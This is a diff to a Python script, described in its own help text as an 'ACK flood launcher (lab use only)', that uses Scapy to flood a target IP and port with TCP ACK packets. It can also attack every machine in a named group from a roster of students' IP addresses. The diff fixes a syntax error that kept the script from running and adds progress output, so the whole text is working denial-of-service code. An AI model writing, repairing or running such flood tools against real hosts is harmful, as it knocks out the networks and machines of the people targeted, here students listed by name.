@@ -24,17 +24,26 @@ def ack_flood(dest_ip, dest_port, packet_count=1000):
         print("Scapy is required to send packets.")
         return
 
+    print("Starting ACK flood to {}:{} ({} packets)".format(
+        dest_ip, dest_port, packet_count))
+
     for i in range(packet_count):
         src_port = random.randint(1024, 65535)
+
         pkt = IP(dst=dest_ip) / TCP(
             sport=src_port,
             dport=dest_port,
             flags="A"
         )
+
         send(pkt, verbose=False)
+
         if (i + 1) % 100 == 0:
-            print("Sent {} packets".format(i + 1))
+            print("  Sent {} packets".format(i + 1))
+
         time.sleep(0.01)
+
+    print("Finished sending to {}".format(dest_ip))
 
 
 def attack_group(group_name, roster, port, count):
@@ -43,13 +52,16 @@ def attack_group(group_name, roster, port, count):
         return
 
     group = roster[group_name]
-    for student, ip in group.items()
+
+    for student, ip in group.items():   # ✅ FIXED (colon added)
         print("Attacking {} -> {}".format(student, ip))
         ack_flood(ip, port, packet_count=count)
 
 
 def main():
-    parser = argparse.ArgumentParser(description="ACK flood launcher (lab use only)")
+    parser = argparse.ArgumentParser(
+        description="ACK flood launcher (lab use only)"
+    )
 
     parser.add_argument(
         "--roster",
@@ -82,7 +94,12 @@ def main():
         ack_flood(args.target_ip, args.port, packet_count=args.count)
 
     if args.target_group:
-        attack_group(args.target_group, roster, port=args.port, count=args.count)
+        attack_group(
+            args.target_group,
+            roster,
+            port=args.port,
+            count=args.count
+        )
 
     if not args.target_ip and not args.target_group:
         print("Use --target-group <name> or --target-ip <ip>")
